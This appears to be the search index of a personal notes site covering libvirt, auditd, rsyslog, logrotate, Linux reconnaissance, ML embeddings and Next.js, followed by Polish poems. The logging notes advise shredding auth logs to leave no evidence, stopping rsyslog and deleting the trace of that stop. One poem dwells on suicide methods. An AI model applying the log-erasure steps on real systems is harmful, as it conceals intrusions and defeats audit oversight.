10G\n</code></pre>"},{"location":"docs/libvird/virsh/#creating-snapshot","title":"Creating snapshot","text":"<p>Docs</p> <pre><code>virsh snapshot-create-as \u2013domain {vm_name} \u2013name {snapshot_name} \u2013description  \u201center description here\u201d\nsudo virsh snapshot-create-as ubuntu25.04 ubuSnap1 \"new snapshot\"\n</code></pre>"},{"location":"docs/libvird/virsh/#listing-domain","title":"Listing Domain","text":"<ul> <li>virsh snapshot-list"},{"location":"docs/libvird/virsh/#reverting","title":"Reverting","text":"<pre><code>virsh snapshot-revert fedora36 snapshot0\n</code></pre> <ul> <li>or to the last one</li> </ul> <pre><code>virsh snapshot-revert fedora36 --current\n</code></pre>"},{"location":"docs/logging/AUDitd/","title":"Rules","text":"","tags":["RHEL"]},{"location":"docs/logging/AUDitd/#youtube-tutorial","title":"Youtube tutorial","text":"","tags":["RHEL"]},{"location":"docs/logging/AUDitd/#defult-rules-repo","title":"Defult rules repo","text":"<pre><code># To Reastart auditd\nservice auditd restart\n</code></pre>","tags":["RHEL"]},{"location":"docs/logging/AUDitd/#ausearch","title":"ausearch","text":"<p>Ausearch Docs - a tool to query audit daemon logs</p>","tags":["RHEL"]},{"location":"docs/logging/AUDitd/#record-typesmessages-m","title":"Record types/Messages <code>-m</code>","text":"<p>The event type is specified in the <code>type=</code> field at the beginning of every Audit record.</p> <p>Docs</p>","tags":["RHEL"]},{"location":"docs/logging/AUDitd/#keys-k","title":"Keys <code>-k</code>","text":"<p>Listing exisiting keys</p> <pre><code>auditctl -l\n</code></pre> <p>U can add new keys with</p> <pre><code>-w /path/to/file -p rwxa -k my_key\n</code></pre> <p>And query by them</p> <pre><code>ausearch -k passwd_changes\n</code></pre>","tags":["RHEL"]},{"location":"docs/logging/AUDitd/#succes-value-sv","title":"Succes value <code>-sv</code>","text":"<p>Use the -m option to identify specific messages and <code>-sv</code> to define the success value.</p> <pre><code>ausearch -m USER_LOGIN -sv no \n</code></pre>","tags":["RHEL"]},{"location":"docs/logging/AUDitd/#selinux-logs","title":"Selinux Logs","text":"<p>[Selinux MAIN]({{\\&lt; ref \u201cposts/SELinux.md#logging\u201d&gt;}})</p>","tags":["RHEL"]},{"location":"docs/logging/AUDitd/#summary","title":"Summary","text":"<p>search for executubles</p> <pre><code>aureport  -i -x --summary\n</code></pre>","tags":["RHEL"]},{"location":"docs/logging/AUDitd/#ausyscall","title":"Ausyscall","text":"<p>It gives u description of the syscall</p> <p>Example</p> <pre><code>#Response is execve which is privilege escalations\nausyscall 59\n</code></pre> <p>Loging on linux</p> <p>tripwire</p> <p>Redhat info</p>","tags":["RHEL"]},{"location":"docs/logging/SysLog/","title":"SysLog","text":"<p>Linux uses a daemon called syslogd to automatically log events on your com\u00ad puter. Several variations of syslog, including rsyslog and syslog-ng, are used on different distributions of Linux, and even though they operate very simi\u00adlarly, some minor differences exist.</p> <p>rsyslog</p>"},{"location":"docs/logging/SysLog/#cleaning-logs-with-logrotate","title":"Cleaning logs with logrotate","text":"<p>logrotate</p> <p>[!quote] syslog_protocol</p>"},{"location":"docs/logging/logrotate/","title":"logrotate","text":""},{"location":"docs/logging/logrotate/#automatically-cleaning-up-logs-with-logrotate","title":"Automatically Cleaning Up Logs with logrotate","text":"<p>At the end of each rotation period, the log files are renamed and pushed toward the end of the chain of logs as a new log file is created, replacing the current log file.</p> <p>For instance, /var/log.auth will become /var/log.auth.1, then /var/log.auth.2, and so on</p>"},{"location":"docs/logging/logrotate/#configure","title":"Configure","text":"<p>Docs</p> <p>The config is located into /etc/logrotate.conf</p> <p>[!example]- </p>"},{"location":"docs/logging/logrotate/#removing-logs","title":"Removing logs","text":"<p>In order to remove files and do not leacve baisic evidance u have to shred the Logfiles</p>"},{"location":"docs/logging/logrotate/#disable-logs","title":"Disable logs","text":"<p>To disable log u have to stop the service daemon service rsyslog stop</p> <p>!! REMEBER to delete the line weere th sys log was stopped!!</p>"},{"location":"docs/logging/reconnaissance/","title":"Linux Reconnaissance","text":""},{"location":"docs/logging/reconnaissance/#get-the-curren-distro","title":"Get the curren distro","text":"<pre><code>cat /etc/*release\n</code></pre>"},{"location":"docs/logging/reconnaissance/#see-what-procces-stated-the-system","title":"See what procces stated the system","text":"<pre><code>cat /proc/cmdline\ncat /proc/cpuinfo\ncat /proc/loavg \n</code></pre>"},{"location":"docs/logging/reconnaissance/#check-for-older-verisons-of-the-kernel","title":"Check for older verisons of the kernel","text":"<pre><code>ls -l /boot/vm*\n#or \napt list -installed | grep linux-image\n</code></pre>"},{"location":"docs/logging/reconnaissance/#check-the-mem-consumption-of-the-process","title":"Check the mem consumption of the process","text":"<pre><code>pgrep -ila \nexpr `pgrep -i   hugo ` / 1024\ncat /proc/$*/status\n</code></pre>"},{"location":"docs/logging/reconnaissance/#see-the-paramters-of-the-system","title":"See the paramters of the system","text":"<pre><code># -S is for the type of metric\nvmstat -S M  1\n</code></pre>"},{"location":"docs/logging/reconnaissance/#failed-attemps-to-login-varlogsecure","title":"Failed attemps to login /var/log/secure","text":"<pre><code># List out ssh login attempts from non-existing and unauthorized user accounts\ncat /var/log/secure | grep 'Invalid user'\n</code></pre> <pre><code># List out ssh login attempts by authorized ssh accounts with failed password\ncat /var/log/secure | grep -v invalid | grep 'Failed password'\n</code></pre>"},{"location":"docs/logging/reconnaissance/#list-out-successful-login-attempts","title":"List out successful login attempts","text":"<pre><code># List out successful ssh login attempts\ncat secure | grep 'Accepted' | awk '{print $1 \" \" $2 \" \" $3 \" User: \" $9 \" \" }'\ncat secure* | sort | grep 'Accepted' | awk '{print $1 \" \" $2 \" \" $3 \" User: \" $9 \" IP:\" $11 }'\n</code></pre> <pre><code># List out successful ssh login attempts from sudo users\ncat /var/log/secure | grep 'session opened for user root' | awk '{print $1 \" \" $2 \" \" $3 \" Sudo User: \" $13 \" \" }'\n</code></pre>"},{"location":"docs/logging/rsyslog/","title":"rsyslog","text":""},{"location":"docs/logging/rsyslog/#rsyslogconf","title":"rsyslog.conf","text":"<p>By defualt in <code>Redhat</code> kernel messages are not collected!</p> <p>Example</p>"},{"location":"docs/logging/rsyslog/#forwording-log-to-a-diffrnetnt-location","title":"Forwording log to a diffrnetnt location","text":"<p>By defualt this puts every log into <code>one giant file</code></p> <p>Ususaly chose one either UDP or TCP both my crasch it</p> <pre><code># Provides UDP syslog reception\n for parameters see http://www.rsyslog.com/doc/imudp.html\nmodule(load=\"imudp\") # needs to be done just once\ninput(type=\"imudp\" port=\"514\")\n\n\n# Provides TCP syslog reception\nfor parameters see http://www.rsyslog.com/doc/imtcp.html\nmodule(load=\"imtcp\") # needs to be done just once\ninput(type=\"imtcp\" port=\"514\")\n</code></pre>"},{"location":"docs/logging/rsyslog/#templatesfilters","title":"Templates/Filters","text":"<p>TemplatingDocs</p> <p>This shoudl have been created as a seprate rule in <code>rsyslog.d</code></p> <p>example</p> <pre><code>template PerHostLog,\"/var/log/syslog/%HOSTNAME%.log\"\nif  $fromhost-ip startswith '192.' then -?PerHostLog\n&amp; STOP\n</code></pre>"},{"location":"docs/logging/rsyslog/#sending-messages-to-the-host","title":"Sending messages to the host","text":"<p>Add this to the end of the rslog.conf</p> <pre><code>*.* @host:514\n</code></pre>"},{"location":"docs/logging/rsyslog/#the-rsyslog-rules","title":"The rsyslog rules","text":"<p>The baisic format of this rules</p> <p><code>facility.priority - action</code></p> <ul> <li>facility refrence the programm such as kernel or smth<ul> <li>facility types<ul> <li><ul> <li>An asterisk wildcard ( * ) in place of a word refers to     all facilities.</li> </ul> </li> </ul> </li> </ul> </li> <li>action Location where the logfiles should be sent</li> <li>priority<ul> <li>The codes warn, error, and panic have all been deprecated and     should not be used.</li> <li>If the priority is * , messages of all priorities are logged.</li> </ul> </li> </ul> <p></p>"},{"location":"docs/logging/shred/","title":"shred","text":""},{"location":"docs/logging/shred/#shred","title":"Shred","text":"<p>Overwrite the specified FILE(s) repeatedly in order to make it harder for even very expensive hardware probing to recover data - On its own, shred will delete the file and overwrite it several times - by default, shred overwrites four times. - u can increase the number of shreds example</p> <pre><code>shred -f -n 10 /var/log/auth.log.*\n</code></pre>"},{"location":"docs/machine_learning/embedings/","title":"embedings","text":""},{"location":"docs/machine_learning/embedings/#embedings","title":"Embedings","text":"<ul> <li>They are ussualy build by implemeting the large dataa set puting     thehm ino a cevtio fo categories and indexing based one the main     node</li> <li>Baiscily a vector of vectors semanticly     similar &gt;[!example]- &gt;     ## Creation          ## Usage</li> <li>Semantic Search<ul> <li>search engines traditionally work by searching for overlaps of     keywords. By leveraging vector embeddings, semantic search can     go beyond keyword matching and deliver based on the query\u2019s     semantic meaning.</li> </ul> </li> <li>Question-answering applications<ul> <li>by training an embedding model with pairs of questions and     corresponding answers, we can create an application that would     answer questions that have not been seen before.</li> </ul> </li> <li>Image search<ul> <li>vector embeddings are perfectly suited to serve as the basis for     image retrieval tasks. There are multiple off-the-shelf models,     such as CLIP, ResNet, and more. Different models handle     different types of tasks like image similarity, object     detection, and many more.</li> </ul> </li> <li>Audio search<ul> <li>by converting the audio into a set of activations (an audio     spectrogram), we produce vector embeddings that can be used for     audio similarity search.</li> </ul> </li> <li>Recommender Systems<ul> <li>we can create embeddings out of structured data that correlate     to different entities such as products, articles, etc. In most     cases, you\u2019d have to create your own embedding model since it     would be specific to your particular application. Sometimes this     can be combined with unstructured embedding methods when images     or text descriptions are found.</li> </ul> </li> <li>Anomaly detection<ul> <li>We can create embeddings for anomaly detection using large data     sets of labeled sensor information that identify anomalous     occurrences.</li> </ul> </li> </ul> <p>[!quote] vector_databse</p>"},{"location":"docs/machine_learning/random_projection/","title":"random projection","text":""},{"location":"docs/machine_learning/random_projection/#random-projection","title":"Random Projection","text":"<p>project the high-dimensional vectors to a lower-dimensional space using a\u00a0random projection matrix</p> <p>[!quote]</p>"},{"location":"docs/next-js/next-js/","title":"next-js","text":""},{"location":"docs/next-js/next-js/#startup","title":"Startup","text":"<p>to start a project in next js type</p> <pre><code>npx create-next-app@latest --ts .\n</code></pre> <p>npm run dev on http://localhost:3000 ## Server/client [[server base rendering]] ## Pages</p> <ul> <li>In order to create a new page u have to make a new folder and     inside of it add page.tsx<ul> <li>Next-jsPages_visual.png</li> </ul> </li> <li>Pages can be nested by sipmly adding new folder to the aleready     existihng one<ul> <li>Dynamic routes are created by enclosing the folder name with     [ ] Next-JSRoutingFolders_visual.png</li> </ul> </li> </ul>"},{"location":"docs/next-js/next-js/#layouts","title":"Layouts","text":"<ul> <li>Lyaouts are like temaplates in Flask     MAIN They are for     *cross-section pages *<ul> <li>U can define multple layouts just by adding layout.js to the     subfolder</li> </ul> </li> </ul>"},{"location":"docs/next-js/next-js/#loadigs","title":"Loadigs","text":"<ul> <li>U can add loading.js file<ul> <li>U will reneder a Loading Skeleton </li> </ul> </li> </ul>"},{"location":"docs/next-js/next-js/#error-handling","title":"Error Handling","text":"<ul> <li>To handle errors create error.js file in sub directory<ul> <li>This wiil present the error acordingly to the user     </li> </ul> </li> </ul> <p>[!quote] React||Flask MAIN||</p> <p>[!tip]- resources nex-js guide</p>"},{"location":"docs/next-js/server_site_rendering/","title":"server site rendering","text":""},{"location":"docs/next-js/server_site_rendering/#flexibility","title":"Flexibility","text":"<ul> <li> <p>In next-js u can choose weather u     want to render site on cilent end or server end</p> <ul> <li>Clienits rendering happens when the browser generate all     the conntets of the page</li> <li>Server rendering renders everrythin before the browser     which enables webcrawlers to have more time to crawl which     improves SEO</li> </ul> </li> </ul> <p>[!quote] Client-server [[serverless]] next-js</p>"},{"location":"docs/next-js/Reactjs/React/","title":"React","text":""},{"location":"docs/next-js/Reactjs/React/#react-framwork","title":"React framwork","text":"<ul> <li>React with     Typescsript<ul> <li> <p>Create app ``` npx create-react-app . \u2013template typescript</p> <p>``` typescript server-less</p> </li> </ul> </li> </ul> <p>[!quote]</p>"},{"location":"docs/nixos/cache/","title":"Manage the cache to speedu the installaton of the [Nixos","text":"<p>Casche](https://nix-community.cachix.org/)</p>"},{"location":"docs/poetry/BabieLato/","title":"Babie Lato","text":"<p>kolejny d\u0142ugi jesienny dzie\u0144 jest ciemno standard zas\u0142oni\u0142em rolety znowu le\u017ce na my\u015bl o wstaniu robi mi si\u0119 gor\u0105co zasn\u0105\u0107 na moment i obudzi\u0107 si\u0119 z mentalnym kacem czy m\u0119czy\u0107 si\u0119 patrz\u0105c w sufit powinienem to zako\u0144czy\u0107 tak wzd\u0142u\u017c planu fantomowy b\u00f3l nadgarstk\u00f3w wino czy przeciwb\u00f3lowe a jak nie dam rady wracamy do punktu wyj\u015bcia dusze si\u0119 zapachem w\u0142asnego cia\u0142a to pewne p\u0142acz \u015bciska mi gard\u0142o wa\u017ce za du\u017co \u017cyrandol nie wytrzyma las te\u017c odpada zbyt \u0142atwo o \u015bwiadka mo\u017ce klasycznie tabletki nawet tu i teraz przez uchylone okno wlatuj\u0105 drobne bia\u0142e nitki zdeformowane twarze dziecko kt\u00f3re umiera przed rodzicem nie ma nic gorszego kolejny d\u0142ugi jesienny dzie\u0144 jest ciemno standard zas\u0142oni\u0142em rolety znowu le\u017ce</p>"},{"location":"docs/poetry/Eliasz/","title":"Eliasz","text":"<pre><code>Eliasz\n</code></pre> <p>Otoczeni przez t\u0142um walizek siedzimy nadzy na materacu biore chust\u0119 i zakrywam ci oczy twoje cia\u0142o zastyga z wewn\u0105trz s\u0142ycha\u0107 jedynie kruche migotanie odgarniam twoje w\u0142osy i ca\u0142uje ci\u0119 w czo\u0142o spok\u00f3j rozcina wargi jeste\u015b coraz g\u0142\u0119biej oddech muska p\u0142atki twoich uszu p\u0119cherzyki topniej\u0105 we wznosz\u0105ce si\u0119 lustra instynktownie wyczuwasz p\u0142ynno\u015b\u0107 powierzchni twoje r\u0119ce znikaj\u0105 w bez kszta\u0142tach zawieszony w przestrzeni pr\u00f3bujesz wgry\u017a\u0107 si\u0119 w moj\u0105 sk\u00f3r\u0119 smak napi\u0119tych mi\u0119\u015bni nag\u0142y dop\u0142yw krwi rozp\u0119dzone rydwany wje\u017cd\u017caj\u0105 w g\u0119ste leje turkot sprawia \u017ce obraz zaczyna drga\u0107 z k\u00f3\u0142 toczy si\u0119 piana kom\u00f3rki gotuj\u0105 si\u0119 do podzia\u0142u wype\u0142niasz mnie py\u0142</p>"},{"location":"docs/poetry/EyesOftheSkin/","title":"EyesOftheSkin","text":"<p>Eyes of the skin</p> <p>Overhead music flows in a compressed stream author detaches itself from visibility bit by bit small vibrations land themselves on the eyebrow causing it to shut parr of blue eyes passes through the body of darkness coolness of glass dryness of gin embodiment of tongue figs start to reveal their micro-treasures almond oil soothes the taste the heat is pouring out all over my head though I feel I can\u2019t recall words structured sensation</p>"},{"location":"docs/poetry/JaPoprowadze/","title":"JaPoprowadze","text":"<p>\u201cdzi\u015b-ja-poprowadz\u0119\u201c</p> <p>Zapach migda\u0142\u00f3w i dzikich r\u00f3\u017c roznosi si\u0119 po ca\u0142ym mieszkaniu plastry miodu odrywaj\u0105 si\u0119 i spadaj\u0105 z sufitu wszystko si\u0119 lepi \u0142\u00f3\u017cko obsiad\u0142y pszczo\u0142y na satynowej po\u015bcieli skrzyde\u0142kami wybrz\u0119kuj\u0105 grzeszyny rytm w ustach wyczuwam nuty porannej kawy owoce liczi orzechy czekolada to staje si\u0119 nie do zniesienia musz\u0119 wzi\u0105\u0107 prysznic szybko \u015bci\u0105gam z siebie przepocone ubranie wchodz\u0119 do kabiny odkr\u0119cam wod\u0119 czuje jak jej kropelki docieraj\u0105 do ognisk mojego cia\u0142a jak para wodna powoli zaspokaja sk\u00f3r\u0119 odrobina cielistego \u017celu \u015bwiadomo\u015b\u0107 oddala si\u0119 coraz bardziej zamykam oczy przypominaj\u0105 mi si\u0119 aromaty brzozy i kardamonu tak typowe dla ciebie niezmienne blakn\u0105ce w \u015bwietle dnia widz\u0119 jak wiruje w ta\u0144cu niedopowiedze\u0144 udaj\u0105c \u017ce wszystko jest ok zbyt nie\u015bmia\u0142a by powiedzie\u0107 pass pora si\u0119 obudzi\u0107 owini\u0119ta czerwonym r\u0119cznikiem odurzona ilo\u015bci\u0105 wra\u017ce\u0144 delikatnie szeptam ci na ucho \u201cDzi\u015b ja poprowadze\u201d</p>"},{"location":"docs/poetry/NaszeTwarze/","title":"NaszeTwarze","text":"<p>\u201cKto pisa\u0142 nasze twarze\u201d</p> <p>Kto pisa\u0142 nasze twarze? powoli wklepuje podk\u0142ad \u015bci\u0105gaj\u0105c go a\u017c do szyi korektor wycisza lekki rumieniec moich my\u015bli troch\u0119 pudru by utrwali\u0107 ca\u0142\u0105 struktur\u0119 wci\u0105\u017c zbyt matowo na przek\u00f3r pani nilu przyda\u0142o by si\u0119 nada\u0107 temu nowych kolor\u00f3w odrobina r\u00f3\u017co-bronzera s\u0142odki zapach innowacji konturuje i o\u017cywia delikatne promienie zachodz\u0105cego s\u0142o\u0144ca roz\u015bwietlaj\u0105 szczyty ko\u015bci policzkowych pora na brwi dobija si\u0119 g\u0142os z dna tafli ostatni wybryk barbarzy\u0144cy podkre\u015blam naturalne rz\u0105dze kilka warstw cieni do oczu drobinki pierwotnych uczu\u0107 \u0142atwiej rozcieraj\u0105 si\u0119 na sobie jeszcze tylko szybka kreska tuszowanie rz\u0119s i mo\u017cemy przej\u015b\u0107 do ust wklepuje pomadk\u0119 opuszkami palc\u00f3w na \u015brodku warg maluje transparentnym b\u0142yszczykiem \u201cwygl\u0105daj\u0105 na nieco rozmyte\u201d czasu do wyj\u015bcia coraz mniej spalam papierosa ostatnie spojrzenie \u0142agodny u\u015bmiech lustro og\u0142asza remis</p>"},{"location":"docs/poetry/PiszePiewszy/","title":"PiszePiewszy","text":"<p>\u201cRozpa\u0142ka\u201d</p> <p>Rozsi\u0105d\u017a si\u0119 wygodnie chc\u0119 wiedzie\u0107 wszystko nap\u0119dza mnie syntetyczne podniecenie urotropina mami twoje zmys\u0142y wszechogarniaj\u0105ce ciep\u0142o oszo\u0142omienie mu\u015bni\u0119cia j\u0119zyk\u00f3w p\u0142omieni fascynacja eksplozje emocji w kominku a\u017c skwierczy czas na mnie rozpadam si\u0119 szarzeje zamieniam w popi\u00f3\u0142 pocz\u0105tkowo ledwie wyczuwalne wonie stopniowo wype\u0142niaj\u0105 pomieszczenie amoniak i formalina nim min\u0105 ci zawroty g\u0142owy zostawi\u0119 jeszcze kartk\u0119 z dat\u0105 kolejnego spotkania tak na wypadek gdyby potrzeba odwzajemnia nie pozwala\u0142a o sobie zapomnie\u0107</p> <p>\u201cP\u0142omyczek\u201d</p> <p>Chcia\u0142by\u015b mnie pozna\u0107 mo\u017ce w co\u015b zagramy nudno tu tak samemu w popiele zas\u0142oni\u0119te \u017caluzje teraz widzisz mnie jak na d\u0142oni tylko nie przygl\u0105daj si\u0119 za d\u0142ugo mo\u017cesz si\u0119 sparzy\u0107 zamkni\u0119te drzwi przepraszam on ju\u017c tak ma m\u00f3j bratni p\u0142omie\u0144 pilnuje bym nie by\u0142a zanadto rozgrzana pytasz czy kiedy\u015b widzia\u0142am ognisko no ba sama by\u0142am ogniskiem przez chwile kilka ga\u0142\u0105zek suchego chrustu ale si\u0119 pali\u0142o czemu zgas\u0142o nape\u0142niona wanna rozerwijmy si\u0119 troch\u0119 w\u0142\u0105cz\u0119 muzyk\u0119 uwielbiam piosenki o mi\u0142o\u015bci drobne skoki temperatur obj\u0119cia p\u0142omieni my\u015bla\u0142am \u017ce o tym wie nie by\u0142am gotowa nie pozwoli\u0142 mi odm\u00f3wi\u0107 pude\u0142ko kolorowych tabletek tylko nie m\u00f3w nikomu to b\u0119dzie nasz ma\u0142y sekret on nie mo\u017ce o niczym wiedzie\u0107 z reszt\u0105 i tak by ci nie uwierzy\u0142 przeciez to jego kolega zapalona lampa czujesz ten \u017car nie b\u0119d\u0119 ju\u017c d\u0142u\u017cej p\u0142omyczkiem zamykam oczy jestem supernow\u0105</p> <p>Iskierka</p> <p>Wiem czego chc\u0105 m\u0119\u017cczy\u017ani Wzi\u0119\u0142abym do buzi Nie cierpi\u0119 Romeo To co \u017ce by\u0142 m\u0142odszy Szybko si\u0119 wypalam Lubi\u0119 robi\u0107 sobie zdj\u0119cia Wznieca\u0107 porz\u0105danie Kobieta to dzie\u0142o sztuki Moje cia\u0142o buzuje Jest mi\u0119kka i pachn\u0105ca Ch\u0142opcy s\u0105 niedojrzali Jej palce w moich wargach Maj\u0105 mnie za zdzir\u0119 Jestem iskierk\u0105 On kupi\u0142 pier\u015bcionek Nie chc\u0119 prezent\u00f3w Czy jest mi z nim dobrze Chce go przekona\u0107 Zaproponowa\u0107 uk\u0142ad Jak zareaguje Ju\u017c sama nie wiem Czy kiedy\u015b zap\u0142on\u0119 ?</p>"},{"location":"docs/poetry/Smiertelna_Kowencja/","title":"Smiertelna Kowencja","text":"<p>\u201c\u015amiertelna konwencja\u2019</p> <p>Jest pewna rzecz kt\u00f3rej zupe\u0142nie nie mog\u0119 zrozumie\u0107 Wyobra\u017a sobie \u017ce jeste\u015b starsz\u0105 osob\u0105. Zaczynasz czu\u0107 si\u0119 \u017ale . Prosty b\u00f3l brzucha przez kt\u00f3ry przechodzi\u0142a ju\u017c chyba z 80 razy. Informujesz o tym syna . W kilka chwil p\u00f3\u017aniej przyje\u017cd\u017ca c\u00f3rka. Zaczyna dramatyzowa\u0107 . My\u015blisz sobie, co\u015b jest nie tak ? Nie masz pewno\u015bci. Nieustannie otoczona przez p\u00f3\u0142 -szepty Umierasz? Konwencja zapad\u0142a Nie ma po co je\u015b\u0107\u201d nie ma po co pi\u0107. Ostatnimi ruchami warg starasz si\u0119 jeszcze raz poczu\u0107 jak samkuje rzeczywisto\u015b\u0107. Nastaje noc. Nie \u015bpisz, Boisz si\u0119 zamkn\u0105\u0107 oczy W ko\u0144cu godzisz si\u0119 ze \u015bwiadomo\u015bci\u0105 \u017ce powieki dadz\u0105 za wygran\u0105. Non stop bilansujesz swoje \u017cycie. Nikt z otoczenia nie zna wyniku. MI\u0119dzy Bogiem a prawd\u0105 ty te\u017c nie mo\u017cesz by\u0107 niczego pewna. Przecie\u017c jest 3 nocy\u2026 Budzisz si\u0119! Na zegarku 12 Twoja rodzona siostra zaprasza ci\u0119 do sto\u0142u. Spogl\u0105dasz w lustro Znowu masz 16 lat . Twoje wnuki biegaj\u0105 wok\u00f3\u0142 twojej g\u0142owy. Trzeba si\u0119 obudzi\u0107 . B\u00f3l w brzuchu jest pora\u017caj\u0105cy. Wreszcie stawiasz diagnoz\u0119 (nowotw\u00f3r z\u0142o\u015bliwy). Wstajesz. Jest poranek Dw\u00f3jka rodze\u0144stwa , o twarzach twoich dzieci , \u015bpi obok ciebie. Jeste\u015b g\u0142odna. Straszliwy b\u00f3l brzucha oznajmia rzeczywisto\u015b\u0107 Nie mo\u017cesz si\u0119 podnie\u015b\u0107 padasz kto\u015b przebiega\u2026. Znowu wstajesz okazuje si\u0119 \u017ce po Raz 10 w ci\u0105gu godziny. \u0141apczywie zjadasz \u015bniadanie. Chleb, mas\u0142o ,woda. Jeste\u015b wyg\u0142odnia\u0142a obiad, podwieczorek kolacje. odczuwasz nag\u0142y powr\u00f3t si\u0142 wtem B\u0142ysk. Wok\u00f3\u0142 siebie widzisz najbli\u017cszych My\u015blisz. Czas umiera\u0107. Tw\u00f3j puls sta\u0142 si\u0119 niestabilny ci\u015bnienie ro\u015bnie. Wydarzenia z przesz\u0142o\u015bci mieszaj\u0105 si\u0119 z wizj\u0105 jutra . A przecie\u017c zacz\u0119\u0142o si\u0119 od zwyk\u0142ego b\u00f3lu brzucha\u2026. Zamykasz oczy ju\u017c po raz setny i nawet b\u00f3g nie wie co si\u0119 zaraz stanie(\u2026)</p>"},{"location":"docs/poetry/kocie_oczy/","title":"Kocie oczy","text":"<p>Dzis mijam noca ulice glodny od nalogt potykajca sie o ludzi wolajacyhc</p> <p>nie dam sie zamknac Dzis leze drwi tlum dokoa Ty sie smiejesz a ja glaszcze jej wlosy bog nadman czuwa nie twoj bog alb jakis inny ale ten znaleziony w potrzebie</p>"},{"location":"docs/poetry/naInsta/","title":"naInsta","text":"<p>\u201cRozpa\u0142ka\u201d (#pisze pierwszy)</p> <p>Rozsi\u0105d\u017a si\u0119 wygodnie chc\u0119 wiedzie\u0107 wszystko nap\u0119dza mnie syntetyczne podniecenie urotropina mami twoje zmys\u0142y wszechogarniaj\u0105ce ciep\u0142o oszo\u0142omienie mu\u015bni\u0119cia j\u0119zyk\u00f3w p\u0142omieni fascynacja eksplozje emocji w kominku a\u017c skwierczy czas na mnie rozpadam si\u0119 szarzeje zamieniam w popi\u00f3\u0142 pocz\u0105tkowo ledwie wyczuwalne wonie stopniowo wype\u0142niaj\u0105 pomieszczenie amoniak i formalina nim min\u0105 ci zawroty g\u0142owy zostawi\u0119 jeszcze kartk\u0119 z dat\u0105 kolejnego spotkania tak na wypadek gdyby potrzeba odwzajemnia nie pozwala\u0142a o sobie zapomnie\u0107</p> <p>\u201cP\u0142omyczek\u201d(#pisze pierwszy)</p> <p>Chcia\u0142by\u015b mnie pozna\u0107 mo\u017ce w co\u015b zagramy nudno tu tak samemu w popiele zas\u0142oni\u0119te \u017caluzje teraz widzisz mnie jak na d\u0142oni tylko nie przygl\u0105daj si\u0119 za d\u0142ugo mo\u017cesz si\u0119 sparzy\u0107 zamkni\u0119te drzwi przepraszam on ju\u017c tak ma m\u00f3j bratni p\u0142omie\u0144 pilnuje bym nie by\u0142a zanadto rozgrzana pytasz czy kiedy\u015b widzia\u0142am ognisko no ba sama by\u0142am ogniskiem przez chwile kilka ga\u0142\u0105zek suchego chrustu ale si\u0119 pali\u0142o czemu zgas\u0142o nape\u0142niona wanna rozerwijmy si\u0119 troch\u0119 w\u0142\u0105cz\u0119 muzyk\u0119 uwielbiam piosenki o mi\u0142o\u015bci drobne skoki temperatur obj\u0119cia p\u0142omieni my\u015bla\u0142am \u017ce o tym wie nie by\u0142am gotowa nie pozwoli\u0142 mi odm\u00f3wi\u0107 pude\u0142ko kolorowych tabletek tylko nie m\u00f3w nikomu to b\u0119dzie nasz ma\u0142y sekret on nie mo\u017ce o niczym wiedzie\u0107 z reszt\u0105 i tak by ci nie uwierzy\u0142 przeciez to jego kolega zapalona lampa czujesz ten \u017car nie b\u0119d\u0119 ju\u017c d\u0142u\u017cej p\u0142omyczkiem zamykam oczy jestem supernow\u0105</p> <p>\u201cIskierka\u201d(#pisze pierwszy)</p> <p>Wiem czego chc\u0105 m\u0119\u017cczy\u017ani Wzi\u0119\u0142abym do buzi Nie cierpi\u0119 Romeo To co \u017ce by\u0142 m\u0142odszy Szybko si\u0119 wypalam Lubi\u0119 robi\u0107 sobie zdj\u0119cia Wznieca\u0107 porz\u0105danie Kobieta to dzie\u0142o sztuki Moje cia\u0142o buzuje Jest mi\u0119kka i pachn\u0105ca Ch\u0142opcy s\u0105 niedojrzali Jej palce w moich wargach Maj\u0105 mnie za zdzir\u0119 Jestem iskierk\u0105 On kupi\u0142 pier\u015bcionek Nie chc\u0119 prezent\u00f3w Czy jest mi z nim dobrze Chce go przekona\u0107 Zaproponowa\u0107 uk\u0142ad Jak zareaguje Ju\u017c sama nie wiem Czy kiedy\u015b zap\u0142on\u0119 ?</p> <p>\u201cMoja dziewczyna \u201c</p> <p>Jej sk\u00f3ra w og\u00f3le nie przypomina nadmorskiego piasku Jej piersi gdzie\u015b poza zak\u0142adk\u0105 \u201cpreferowane\u201d Nie mog\u0119 dopatrzy\u0107 si\u0119 brzoskwini gdy si\u0119ga po pranie Nie zaoferuje siebie w zamian za odetkanie kranu Trudno przyr\u00f3wna\u0107 jej kresk\u0119 do tej z magazynu mody Widzia\u0142em u\u015bmiech kt\u00f3rego blask sprawia\u0142 \u017ce by\u0142em w stanie kupi\u0107 wszystko U\u015bmiech kt\u00f3rego nie odwzoruj\u0105 jej pop\u0119kane usta Inne lataj\u0105 odrzutowcami zwiedzaj\u0105 opuszczone aquaparki A ona wci\u0105\u017c pozuje na tle tej samej \u015bciany Nigdy nie pozna\u0142em osobi\u015bcie bogini instagrama Moja dziewczyna ma ledwie dwudziestu followers\u00f3w Ale kocham j\u0105 przez pryzmat moich oczu Zupe\u0142nie wolny od wizji fotografa</p> <p>\u201cSpotkanie\u201d</p> <p>tykanie zegara czekam na wiadomo\u015b\u0107 wiatrak narzeka bez celu procesor zaraz si\u0119 przegrzeje tykanie zegara gdzie\u015b obok szmery w radiu wci\u0105\u017c te same odg\u0142osy krok\u00f3w stopniowa autodestrukcja tykanie zegara to ju\u017c 6 miesi\u0119cy brz\u0119k telefonu cisza poch\u0142on\u0119\u0142a rzeczywisto\u015b\u0107 jedno spojrzenie tykanie zegara zegara tykanie tykanie zegara</p> <p>\u201cKto pisa\u0142 nasze twarze\u201d</p> <p>Kto pisa\u0142 nasze twarze? powoli wklepuje podk\u0142ad \u015bci\u0105gaj\u0105c go a\u017c do szyi korektor wycisza lekki rumieniec moich my\u015bli troch\u0119 pudru by utrwali\u0107 ca\u0142\u0105 struktur\u0119 wci\u0105\u017c zbyt matowo na przek\u00f3r pani nilu przyda\u0142o by si\u0119 nada\u0107 temu nowych kolor\u00f3w odrobina r\u00f3\u017co-bronzera s\u0142odki zapach inspiracji konturuje i o\u017cywia delikatne promienie zachodz\u0105cego s\u0142o\u0144ca roz\u015bwietlaj\u0105 szczyty ko\u015bci policzkowych pora na brwi dobija si\u0119 g\u0142os z dna tafli ostatni wybryk barbarzy\u0144cy podkre\u015blam naturalne rz\u0105dze kilka warstw cieni do oczu drobinki pierwotnych uczu\u0107 \u0142atwiej rozcieraj\u0105 si\u0119 na sobie jeszcze tylko szybka kreska tuszowanie rz\u0119s i mo\u017cemy przej\u015b\u0107 do ust wklepuje pomadk\u0119 opuszkami palc\u00f3w na \u015brodku warg 